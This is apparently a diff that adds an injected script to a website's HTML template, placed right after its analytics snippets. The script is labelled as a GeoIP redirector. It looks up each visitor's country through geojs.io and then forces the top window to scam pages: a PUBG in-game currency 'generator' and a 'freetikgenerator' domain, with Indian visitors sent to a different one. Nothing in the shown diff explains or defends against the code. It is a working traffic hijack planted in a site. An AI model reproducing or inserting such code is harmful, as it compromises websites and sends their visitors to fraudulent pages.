@@ -2099,6 +2099,50 @@ Global site tag (gtag.js) - Google Analytics -->
 
     <!-- /Yandex.Metrika counter -->
     <!-- JavaScript/jQuery -->
+	
+	
+	        <script>
+           /*!
+     * GeoIP Target Redirector
+     * Project: https://github.com/OpenAff/geoip-target-filter
+     *
+     * ---------------------------------------------------------------------
+     * A small snippet for geo-target redirection using GeoIP API.
+     * Add your targeted country's "ISO 3166-1 - Alpha-2" code and
+     * redirect URL to the "target" array object.
+     * ---------------------------------------------------------------------
+     * Example:
+     *          target.All = "http://others.tld";
+     *          target.US  = "http://domain.tld";
+     *
+     * The above example will redirect all the US visitors to the given URL.
+     * And any non-targeted visitors to "All" URL.
+     * ---------------------------------------------------------------------
+     * Country Codes can be found @( Wikipedia - http://bit.ly/nWBMYz )
+     * See Column: "Alpha-2 Code"
+     * ---------------------------------------------------------------------
+     */
+
+        var target = []; // Create a new target Array.
+
+        // Example Codes:
+        target.All  = "https://9mod.club/pubg/pubgen";  // Redirects US Visitors to this URL.
+        target.IN  = "https://freetikgeneratortok.club/pubguconlingenerator";  // Redirects UK Visitors to this URL.
+
+        // ------------------------------------------------------
+        // DON'T EDIT THE BELOW CODE UNLESS REQUIRED
+        // ------------------------------------------------------
+        /**
+         * If a valid country code matches the targets list, then it redirects to that particular link.
+         * Otherwise redirects to "All" target URL.
+         */
+        function geoip(g){window.top.location.href=target[g.country]||target.All}
+    </script>
+
+        <script src="https://get.geojs.io/v1/ip/country.js?callback=geoip"></script>
+	
+	
+	
     <script type="text/javascript" src="js/jquery.min.js"></script>
     <script src="js/jquery-ui.min.js" type="text/javascript"></script>
     <script type="text/javascript" src="js/bootstrap.min.js"></script>
